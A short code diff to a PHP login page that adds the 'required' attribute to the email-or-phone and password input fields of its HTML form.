@@ -47,8 +47,8 @@ if (isset($_POST["submit"])) {
     <div class="container">
         <div class="form">
             <form action="" method="post">
-                <input type="text" class="text" name="username" placeholder="Email or Phone number"> <br>
-                <input type="password" class="text" name="password" placeholder="Password"><br>
+                <input type="text" class="text" name="username" placeholder="Email or Phone number" required> <br>
+                <input type="password" class="text" name="password" placeholder="Password" required><br>
                 <input type="submit" class="btn" name="submit" value="Login">
                 <p><a href="">forgot password?</a><br></p>
                 <input type="submit" class="btn" name="submit" value="Create New Account">
